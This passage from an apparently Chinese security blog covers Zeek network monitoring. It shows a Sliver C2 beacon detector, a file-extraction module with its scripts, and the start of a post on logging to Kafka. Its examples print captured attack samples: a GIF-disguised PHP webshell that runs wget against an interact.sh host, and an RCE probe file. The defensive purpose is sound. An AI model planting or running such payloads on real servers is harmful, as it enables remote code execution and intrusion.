class="line">    <span class="keyword">if</span> (c$http$method == <span class="string">&quot;GET&quot;</span> &amp;&amp; c$http$status_code == <span class="number">204</span> &amp;&amp; c$http?$cookie &amp;&amp; (c$http$uid in http_connection_state) &amp;&amp; (c$http$cookie == http_connection_state[c$http$uid])) &#123;</span><br><span class="line">        local key_str = <span class="built_in">fmt</span>(<span class="string">&quot;%s#####%s#####%s#####%s#####%s&quot;</span>, c$http$uid, c$id$orig_h, c$http$host, c$id$resp_p, c$http$cookie);</span><br><span class="line">        local observe_str = c$http$uri;</span><br><span class="line"></span><br><span class="line">        # <span class="function">Create an observation <span class="keyword">for</span> statistical analysis</span></span><br><span class="line"><span class="function">        <span class="title">SumStats::observe</span><span class="params">(<span class="string">&quot;sliver_http_beacon_traffic_event&quot;</span>, [$str=key_str], [$str=observe_str])</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># <span class="function">Event to initialize <span class="keyword">and</span> configure statistical mechanisms</span></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    local r1 = SumStats::<span class="built_in">Reducer</span>($stream=<span class="string">&quot;sliver_http_beacon_traffic_event&quot;</span>, $apply=<span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line"></span><br><span class="line">    # <span class="function">Set up the statistical analysis parameters</span></span><br><span class="line"><span class="function">    <span class="title">SumStats::create</span><span class="params">([</span></span></span><br><span class="line"><span class="params"><span class="function">        $name=<span class="string">&quot;sliver_http_beacon_traffic_event.unique&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        $epoch=<span class="number">10</span>sec,</span></span></span><br><span class="line"><span class="params"><span class="function">        $reducers=set(r1),</span></span></span><br><span class="line"><span class="params"><span class="function">        $threshold=<span class="number">3.0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        $threshold_val(key: SumStats::Key, result: SumStats::Result) = &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">return</span> result[<span class="string">&quot;sliver_http_beacon_traffic_event&quot;</span>]$num + <span class="number">0.0</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">        &#125;,</span></span></span><br><span class="line"><span class="params"><span class="function">        $threshold_crossed(key: SumStats::Key, result: SumStats::Result) = &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">if</span> (result[<span class="string">&quot;sliver_http_beacon_traffic_event&quot;</span>]$unique == <span class="number">3</span>) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">                local key_str_vector: vector of string = split_string(key$str, /#####/);</span></span></span><br><span class="line"><span class="params"><span class="function">                local suspicious_uri: set[string];</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">for</span> (value in result[<span class="string">&quot;sliver_http_beacon_traffic_event&quot;</span>]$unique_vals) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">if</span> (! is_suspicious_query(<span class="string">&quot;GET&quot;</span>, value$str)) <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">                    add suspicious_uri[value$str];</span></span></span><br><span class="line"><span class="params"><span class="function">                &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">                # Issue a notice <span class="keyword">if</span> suspicious behavior is observed</span></span></span><br><span class="line"><span class="params"><span class="function">                NOTICE([</span></span></span><br><span class="line"><span class="params"><span class="function">                    $note=Sliver_HTTP_Beacon_Traffic,</span></span></span><br><span class="line"><span class="params"><span class="function">                    $uid=key_str_vector[<span class="number">0</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">                    $src=to_addr(key_str_vector[<span class="number">1</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">                    $host=key_str_vector[<span class="number">2</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">                    $p=to_port(key_str_vector[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">                    $cookie=key_str_vector[<span class="number">4</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">                    $uris=suspicious_uri,</span></span></span><br><span class="line"><span class="params"><span class="function">                    $msg=fmt(<span class="string">&quot;[+] Sliver HTTP beacon traffic detected, %s -&gt; %s:%s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">                    $sub=cat(<span class="string">&quot;Sliver HTTP beacon traffic&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">                ]);</span></span></span><br><span class="line"><span class="params"><span class="function">            &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">        &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">    ])</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="“看疗效”"><a href="#“看疗效”" class="headerlink" title="“看疗效”"></a>“看疗效”</h4><p><img src="/2023/11/08/Zeek-Detect-Sliver/iShot_2023-11-08_20.33.42.png" alt="iShot_2023-11-08_20.33.42"></p>
<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>​    <strong>感觉以后自己越来越少机会写这些了。。。但我还是想说：开源是“理念”，分享是“精神”。请让专业的人做专业的事！</strong></p>
<p><img src="https://img.5youqu.com/bqimg/5eef6257gy1h3z3zb2kndj20u00u00uj.jpg" alt="你要是闲着没事干 就去把村口的粪挑了"></p>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
        <tag>NIDS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek - File Extraction Plus</title>
    <url>/2021/12/31/Zeek-File-Extraction-Plus/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>最近在研究如何将Wazuh与YARA整合，也就是当触发Wazuh FIM事件时通过使用Wazuh主动响应模块自动执行YARA扫描。该功能将扫描集中在新文件或最近修改过的文件上，从而优化了被监控端点的资源消耗。由于我司的业务特性，最先想到的场景就是WebShell的检测了。</p>
<p>下面来说说在实际环境中带来的“挑战”吧。该功能主要是依托Wazuh FIM事件，如果大家熟悉Wazuh的话都应该知道，触发FIM事件的必要条件是指定监控目录。那么，当你拿着从CMDB筛选出的Web服务器给到运维询问Web路径时，你很可能无法得到你想要的答案。对于这种路径不统一的情况，你可以选择自己人工手动收集并维护，如果面对上千台的服务器，那会花费大量的时间成本，或者你可以选择将问题上升推进整改（这条“路”不好走啊😂）。</p>
<h4 id="办法总比困难多"><a href="#办法总比困难多" class="headerlink" title="办法总比困难多"></a>办法总比困难多</h4><p>都说上帝为你关了一扇门，必定会为你打开一扇窗。某天在写代码时看到Twitter推了一条Zeek的动态，此时，我悟了😅！纠结个毛的路径？我直接把需要的数据在NTA上还原出来不就得了，只需将EDR装在NTA上并监控文件还原的目录即可。至于我为啥选择Zeek没用Suricata，主要还是因为Zeek可定制化程度比Suricata更高一些。另外一点Zeek支持集群化部署，规则可以直接由Manager统一下发，这点要比Suricata方便很多，当然这也得益于集群的优势。</p>
<p>说回文件还原的事儿，Zeek上已经有 “前人” (<strong><a href="https://github.com/hosom/file-extraction/actions"><em>hosom</em></a></strong>) 写过一个文件还原的模块。不过在使用中也发现了一些不太贴合我这边实际场景的情况，好在Zeek非常的“<strong>Open</strong>”😁只需要稍加改动就可以满足我的需求了。</p>
<h4 id="做了哪些改进"><a href="#做了哪些改进" class="headerlink" title="做了哪些改进"></a>做了哪些改进</h4><ul>
<li><p>去其糠糟，取其精华</p>
<p>Zeek 和 Suricata 记录日志的方式比较相似，都是根据事件类型来记录日志。正因如此，若想对文件还原事件进行溯源，还需借助协议解析日志来进行上下文的关联。例如，通过HTTP协议还原的文件，就需要借助<code>http.log</code>。由于在我的实际环境中HTTP流量很大，如果不对协议解析的事件做过滤的话，那么输出的日志量会非常的“恐怖”。因此，我做了一些优化，现在只有当匹配到文件还原事件后，才会输出对应的协议解析事件。</p>
<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/file-extension-logs.zeek">file-extension-logs.zeek</a></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record Files::Info += &#123;</span><br><span class="line">      flags:      <span class="built_in">string</span>      &amp;<span class="keyword">default</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">Files::log_policy</span><span class="params">(rec: Files::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$flags == <span class="string">&quot;&quot;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(Files::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;file_extraction&quot;</span>, $path=<span class="string">&quot;file-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(Files::LOG, filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record HTTP::Info += &#123;</span><br><span class="line">      records:    <span class="keyword">bool</span>        &amp;<span class="keyword">default</span>=F;</span><br><span class="line">      domain:     <span class="built_in">string</span>      &amp;optional &amp;<span class="built_in">log</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$records == F )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(HTTP::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;http_extraction&quot;</span>, $path=<span class="string">&quot;http-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(HTTP::LOG, filter);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">export</span> &#123;</span><br><span class="line">      global http: function(f: fa_file): fa_file;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">http</span><span class="params">(f: fa_file)</span>: fa_file</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      f$http$records = T;</span><br><span class="line">      f$http$domain = f$http$host;</span><br><span class="line">      <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例 - 1</strong></p>
<p>**<a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a>**，负责记录命中文件还原的协议解析事件，后期通过将2个事件fuid字段进行关联，可以帮助我们更好的去分析整个事件。</p>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png" alt="image-20211101202304818"></p>
</li>
<li><p>更灵活，更强大</p>
<p>​    支持根据文件类型选择<strong>hash</strong>或者<strong>extract</strong> </p>
<p>​    <strong>hash</strong>: 只计算文件的HASH但不对此文件进行提取；</p>
<p>​    <strong>extract</strong>: 还原指定类型的文件。支持针对HTTP协议，可选域名、URI、请求方法等字段组合进行提取，文件还原后按照日期存储；</p>
<p><strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/extract-custom.zeek">extract-custom.zeek</a></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FileExtraction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_types: <span class="built_in">set</span>[<span class="built_in">string</span>, <span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;text/x-php&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-pdf&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_extract: <span class="built_in">set</span>[<span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;POST&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;extract&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;extract&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;hash&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;hash&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::http_extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( f$http?$host &amp;&amp; f$http?$method &amp;&amp; f$http?$uri &amp;&amp; f$info$is_orig )</span><br><span class="line">            <span class="keyword">if</span> ( [f$http$method] in custom_extract )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        f$info$flags = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/store-files-by-md5.zeek">store-files-by-md5.zeek</a></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line">@load policy/frameworks/files/hash-all-files</span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtraction::path == <span class="string">&quot;&quot;</span> )</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">	<span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 按照日期进行文件的还原存储</span></span><br><span class="line">	<span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">	<span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">	<span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtraction::path, ndate);</span><br><span class="line">	mkdir(dest_dir);</span><br><span class="line">	<span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s-%s.%s&quot;</span>, dest_dir, f<span class="variable">$source</span>, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s %s&quot;</span>, orig, dest);</span><br><span class="line">	when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">	    &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( rename(orig, dest) )</span><br><span class="line">    	f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>示例 - 2</strong></p>
<ul>
<li>Zeek - Files</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-4.png" alt="image-20211101213845765"></p>
<ul>
<li>​    Zeek - HTTP</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-7.png" alt="image-20211101220829730"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-2f48899b463009a77234056c62f5c4fb.gif</span><br><span class="line">GIF89a213213123&lt;?php shell_exec(<span class="string">&quot;wget -c http://c5vi7ua23aksl756fsdgcf9186ayyyyoy.interact.sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>示例 - 3</strong></p>
<ul>
<li>Zeek - Files</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-5.png" alt="image-20211101214516921"></p>
<ul>
<li>Zeek - HTTP</li>
</ul>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-6.png" alt="image-20211101214915506"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-c77da62fa1b8f687ea423581657dcc2c.php</span><br><span class="line">&lt;?php <span class="built_in">echo</span> md5(<span class="string">&#x27;phpcollab_rce&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>



<p><strong>小提示：</strong></p>
<p>当启用文件提取时，记得调整Zeek的这个配置，指定最大提取数据大小，否则会出现提取被截段的现象。</p>
<ul>
<li>file-extract_limit.zeek</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">redef FileExtract::default_limit = <span class="number">5000000000</span>;</span><br></pre></td></tr></table></figure>



<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><ul>
<li><p><strong><a href="https://github.com/Canon88/file-extraction-plus">canon/file-extraction-plus</a></strong></p>
</li>
<li><p><strong><a href="https://github.com/hosom/file-extraction/actions">hosom/file-extraction</a></strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek-Kafka 之 硬盘舒服了!</title>
    <url>/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>​    哎，今年上半年实在太忙了，工作中一些琐碎的事让我日常处于和技术“脱线”的状态。好不容易挤出一点时间来整理一下手头的东西，想着还有哪些可以拿出来给大家分享。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​    由于流量镜像后的网络流量太大，若想利用Zeek将数据解析后进行分析，硬盘的空间以及I/O是我们必须考虑的。虽然我们可以写个脚本做定时任务清除，但这并不是最优解决方案。至少在我的场景中这些数据都是需要发送到Kafka上的，如果能做到在数据源阶段就不用落地在本地磁盘岂不美哉？所以，我需要对数据采集后的写入方式进一步优化。</p>
<ul>
<li><p>优化前</p>
<p>Zeek将日志留存在本地硬盘，由本地安装的filebeat发送给Kafka，最终落地到SIEM上。</p>
<p><img src="/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/zeek-to-filebeat.png" alt="image-20220705172727370"></p>
<hr>
</li>
<li><p>优化后</p>
<p>Zeek日志将不会留存在本地硬盘上，由Zeek Kafka插件将日志发送到Kafka集群，省去了数据落盘的步骤。</p>
<p><img src="/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/zeek-to-kafka.png" alt="image-20220705173013941"></p>
</li>
</ul>
<h4 id="安排"><a href="#安排" class="headerlink" title="安排"></a>安排</h4><p>​    之前就有了解过Zeek可以通过插件的形式将日志发送到Kafka上，由于当时没有需求也就没有继续探究，想着这次需求来了就开启了“折腾”模式。本次我使用的是<a href="https://github.com/SeisoLLC/zeek-kafka"><strong>Zeek-Kafka</strong></a>这个插件，很多网上的文章介绍的插件是 <a href="https://github.com/apache/metron-bro-plugin-kafka"><strong>metron-bro-plugin-kafka</strong></a>。大家可以认为这个是<a href="https://github.com/SeisoLLC/zeek-kafka"><strong>Zeek-Kafka</strong></a>的前身，后者（<a href="https://github.com/apache/metron-bro-plugin-kafka"><strong>metron-bro-plugin-kafka</strong></a>）已经并没有在更新了。使用的话还是推荐<a href="https://github.com/SeisoLLC/zeek-kafka"><strong>Zeek-Kafka</strong></a>。</p>
<p><strong>安装</strong></p>
<p>​    安装流程比较简单，参考文档<a href="https://github.com/SeisoLLC/zeek-kafka"><strong>Zeek-Kafka</strong></a>即可。至此文章结束。下期再会！</p>
<hr>
<p><strong>知识点</strong></p>
<p>​    OK，在开始之前我们来聊一下使用了这个插件之后我认为需要调整的地方以及一些Zeek知识点的补充。</p>
<p><strong>重新认识Zeek日志框架</strong></p>
<p>​    为什么这么说？上面有说到，我做此事的目的是为了<strong>节省硬盘空间、降低I/O的压力</strong>。实际在我使用此插件时，它会把日志发送到Kafka集群并同时保留原始的日志数据在本地硬盘<em>（擦，忙活半天，搞了个寂寞！）</em>。不过，至少确认日志发送到Kafka是OK的，现在我们只需要有选择性的drop掉写入硬盘的操作即可。为了满足这个需求，就需要我们先了解一下<a href="https://docs.zeek.org/en/v4.2.2/frameworks/logging.html"><strong>Zeek - Logging Framework（日志框架）</strong></a>。由于我之前写过一些Zeek的检测场景，对于这个框架并不陌生，只不过理解上不够深入，经过这一次，算是比之前有了更加深入的理解。</p>
<p>Zeek 的日志接口是围绕三个对象构建的：</p>
<p><img src="/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/Streams-Filters-Writers.png" alt="image-20220716232345238"></p>
<ul>
<li><p><strong>Streams</strong>（流）</p>
<p>​    一个日志流对应于一个单一的日志。它定义了一个日志所包含的字段的集合，以及它们的名称和类型。例如，conn流用于记录连接摘要，http流用于记录HTTP活动。</p>
</li>
<li><p><strong>Filters</strong>（过滤器）</p>
<p>​    每个流都有一组过滤器，决定哪些信息被写出来，以及如何写出来。默认情况下，每个流都有一个默认的过滤器，直接把所有的东西都记录到磁盘上。然而，可以添加额外的过滤器，只记录日志记录的一个子集，写到不同的输出，或者设置一个自定义的旋转间隔。如果从一个流中删除所有的过滤器，那么该流的输出就会被禁用。</p>
</li>
<li><p><strong>Writers</strong>（写入器）</p>
<p>​    每个过滤器都有一个写入器。写入器定义了被记录信息的实际输出格式。默认的是ASCII写入器，它产生以制表符分隔的ASCII文件。其他写入器是可用的，比如二进制输出或直接记录到数据库。</p>
</li>
</ul>
<p><strong>简单总结</strong>：<font color="red"><strong>Streams与Filters关系是一对多，Filters与Writers关系是一对一。</strong></font></p>
<p><strong>我们可以用以下几种方式来定制Zeek的日志：</strong></p>
<ol>
<li><p>创建一个新的日志流</p>
</li>
<li><p>用新的字段来扩展现有的日志</p>
</li>
<li><p>对现有的日志流应用过滤器</p>
</li>
<li><p>通过设置日志写入器选项来定制输出格式</p>
</li>
</ol>
<hr>
<p>根据我们的需求，这里选择<font color="red"><strong>方案3</strong></font>（<em>对现有的日志流应用过滤器</em>）。你会用到的方法如下：</p>
<ul>
<li>删除指定流的过滤器：<a href="https://docs.zeek.org/en/v4.0.5/scripts/base/frameworks/logging/main.zeek.html#id-Log::remove_filter"><strong>Log::remove_filter</strong></a></li>
<li>创建一个新的过滤器：<a href="https://docs.zeek.org/en/v4.2.2/scripts/base/frameworks/logging/main.zeek.html?highlight=Log::Filter#type-Log::Filter"><strong>Log::Filter</strong></a></li>
<li>绑定过滤器与流关系：<a href="https://docs.zeek.org/en/v4.2.2/scripts/base/frameworks/logging/main.zeek.html?highlight=Log::Filter#id-Log::add_filter"><strong>Log::add_filter</strong></a></li>
<li>获取指定流的过滤器：<a href="https://docs.zeek.org/en/v4.2.2/scripts/base/frameworks/logging/main.zeek.html?highlight=Log::Filter#id-Log::get_filter"><strong>Log::get_filter</strong></a></li>
</ul>
<p>以下任意一种方式都可以满足我们的需求，既原始日志不会落地在硬盘且直接写入Kafka集群。</p>
<p><strong>示例代码1：删除默认过滤器</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span> &amp;priority</span>=<span class="number">-10</span></span><br><span class="line">&#123;</span><br><span class="line">  	# <span class="number">1.</span> 删除默认过滤器</span><br><span class="line">    Log::<span class="built_in">remove_filter</span>(HTTP::LOG, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  	# <span class="number">2.</span> 创建新的过滤器</span><br><span class="line">    local http_filter: Log::Filter = [</span><br><span class="line">        $name = <span class="string">&quot;kafka-http&quot;</span>,</span><br><span class="line">        $writer = Log::WRITER_KAFKAWRITER,</span><br><span class="line">        $path = <span class="string">&quot;http&quot;</span></span><br><span class="line">    ];</span><br><span class="line">  	# <span class="number">3.</span> 绑定流与过滤器</span><br><span class="line">    Log::<span class="built_in">add_filter</span>(HTTP::LOG, http_filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例代码2 - 修改默认过滤器</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span> &amp;priority</span>=<span class="number">-10</span></span><br><span class="line">&#123;</span><br><span class="line">  	# <span class="number">1.</span> 获取默认过滤器</span><br><span class="line">  	local f = Log::<span class="built_in">get_filter</span>(HTTP::LOG, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  	# <span class="number">2.</span> 修改默认写入器</span><br><span class="line">  	f$writer = Log::WRITER_KAFKAWRITER;</span><br><span class="line">  	# <span class="number">3.</span> 绑定流与过滤器</span><br><span class="line">    Log::<span class="built_in">add_filter</span>(HTTP::LOG, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>真实场景</strong></p>
<ol>
<li><p>场景1：适配HTTP的文件还原（file-extraction-plus）场景</p>
<ul>
<li><p>kafka/kafka-config.zeek</p>
<p>​    定义Kafka集群的配置</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">redef Kafka::kafka_conf = <span class="built_in">table</span>(</span><br><span class="line">    [<span class="string">&quot;metadata.broker.list&quot;</span>] = <span class="string">&quot;node-1:9092,node-2:9092,node-3:9092&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">redef Kafka::json_timestamps = JSON::TS_ISO8601;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>file-extraction-plus/http-extension-logs.zeek</p>
<p>​    优化<a href="https://github.com/Canon88/file-extraction-plus"><strong>file-extraction-plus（文件还原）</strong></a>脚本，这里需要为文件还原的HTTP日志新增过滤器（http_extraction），确保能够被接下来引用。因此，需要用到<a href="https://docs.zeek.org/en/v4.2.2/scripts/base/frameworks/logging/main.zeek.html#type-Log::PolicyHook"><strong>Log::PolicyHook</strong></a>方法。</p>
</li>
</ul>
